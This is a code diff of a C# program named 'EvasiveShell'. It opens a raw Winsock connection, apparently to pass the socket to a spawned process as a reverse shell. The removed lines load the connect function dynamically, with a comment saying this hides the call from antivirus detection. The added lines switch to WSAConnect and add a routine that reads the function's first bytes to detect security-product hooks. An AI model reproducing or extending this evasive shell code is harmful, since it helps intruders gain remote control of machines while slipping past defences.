@@ -1,6 +1,7 @@
 ﻿namespace EvasiveShell
 {
   using System.Diagnostics;
+  using System.Net;
   using System.Net.Sockets;
   using System.Runtime.InteropServices;
   using System.Text;
@@ -8,6 +9,8 @@
 
   public class Program
   {
+    const uint FIONBIO = 0x8004667E;
+
     [StructLayout(LayoutKind.Sequential)]
     public struct sockaddr_in
     {
@@ -94,6 +97,9 @@
     public static extern IntPtr WSASocketA(int af, int type, int protocol, IntPtr protocolInfo, int group, int dwFlags);
 
     [DllImport("Ws2_32.dll", SetLastError = true)]
+    public static extern int WSAConnect(IntPtr socket, ref sockaddr_in name, int nameLen, IntPtr lpCallerData, IntPtr lpCalleeData, IntPtr lpSQOS, IntPtr lpGQOS);
+
+    [DllImport("Ws2_32.dll", SetLastError = true)]
     public static extern ushort htons(ushort port);
 
     [DllImport("Ws2_32.dll", SetLastError = true)]
@@ -103,10 +109,16 @@
     private static extern int WSADuplicateSocket(IntPtr s, uint dwProcessId, ref WSAPROTOCOL_INFO lpProtocolInfo);
 
     [DllImport("kernel32.dll", SetLastError = true)]
-    static extern IntPtr LoadLibrary(string dllToLoad);
+    static extern IntPtr LoadLibrary(string lpFileName);
 
     [DllImport("kernel32.dll", SetLastError = true)]
-    static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
+    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead);
+
+    [DllImport("ws2_32.dll", SetLastError = true)]
+    static extern int WSAIoctl(IntPtr s, uint dwIoControlCode, ref uint lpvInBuffer, int cbInBuffer, IntPtr lpvOutBuffer, int cbOutBuffer, out int lpcbBytesReturned, IntPtr lpOverlapped, IntPtr lpCompletionRoutine);
 
     [StructLayout(LayoutKind.Sequential)]
     public struct WSAPROTOCOL_INFO
@@ -142,12 +154,11 @@
       public uint[] ChainEntries;
     }
 
-    delegate int ConnectSocketDelegate(IntPtr socket, IntPtr sockAddr, int sockAddrLength);
-
-    public static void Main(string[] args)
+    public static async Task Main(string[] args)
     {
       if (File.Exists("C:\\Temp\\socketinfo.bin"))
         File.Delete("C:\\Temp\\socketinfo.bin");
+
 
       Helpers.InitializeWSA();
       var sockAddrIn = new sockaddr_in();
@@ -159,21 +170,17 @@
       Marshal.StructureToPtr(sockAddrIn, sockAddrInPtr, false);
       var socket = WSASocketA(2, 1, 6, IntPtr.Zero, 0, 0);
 
-      Console.WriteLine("Socket established trying to connect.");
+      Console.WriteLine("Socket established.");
       var protocolInfo = new WSAPROTOCOL_INFO();
 
-      // Trying to hide the connect win32 api call from antivirus detection
-      IntPtr hModule = LoadLibrary("Ws2_32.dll");
-      IntPtr ptrConnect = GetProcAddress(hModule, "connect");
+      uint nonBlockingMode = 1;
+      int ret = WSAIoctl(socket, FIONBIO, ref nonBlockingMode, sizeof(uint), IntPtr.Zero, 0, out int bytesReturned, IntPtr.Zero, IntPtr.Zero);
 
-      ConnectSocketDelegate connect = Marshal.GetDelegateForFunctionPointer<ConnectSocketDelegate>(ptrConnect);
-      Console.WriteLine("Created connection delegate, calling now.");
-      var connectSuccess = connect(socket, sockAddrInPtr, Marshal.SizeOf(sockAddrIn));
-
-      if (connectSuccess != 0)
-        Environment.Exit(1);
-
-      Console.WriteLine("Connect success");
+      if (ret != 0)
+        await Console.Out.WriteLineAsync("WSAIoctl failed");
+      
+      WSAConnect(socket, ref sockAddrIn, Marshal.SizeOf(sockAddrIn), IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+      //connect(socket, sockAddrInPtr, Marshal.SizeOf(sockAddrIn));
 
       STARTUPINFO startupInfo = new STARTUPINFO();
       Marshal.AllocHGlobal(Marshal.SizeOf(startupInfo));
@@ -191,6 +198,30 @@
         Directory.CreateDirectory("C:\\Temp");
 
       File.WriteAllBytes("C:\\Temp\\socketinfo.bin", serialized);
+    }
+
+    private static bool DetectHooks()
+    {
+      IntPtr dll = LoadLibrary("Ws2_32.dll");
+
+      if (dll == IntPtr.Zero)
+        return false;
+
+      IntPtr functionAddress = GetProcAddress(dll, nameof(connect));
+
+      if (functionAddress == IntPtr.Zero)
+      {
+        Console.WriteLine("Function address konnte nicht gelesn werden.");
+        return false;
+      }
+
+      var bytes = new byte[16];
+      ReadProcessMemory(Process.GetCurrentProcess().Handle, functionAddress, bytes, bytes.Length, out int bytesRead);
+
+      foreach (var item in bytes)
+        Console.WriteLine(item);
+
+      return true;
     }
 
     private static byte[] SerializeProtocolInfo(WSAPROTOCOL_INFO protocolInfo)
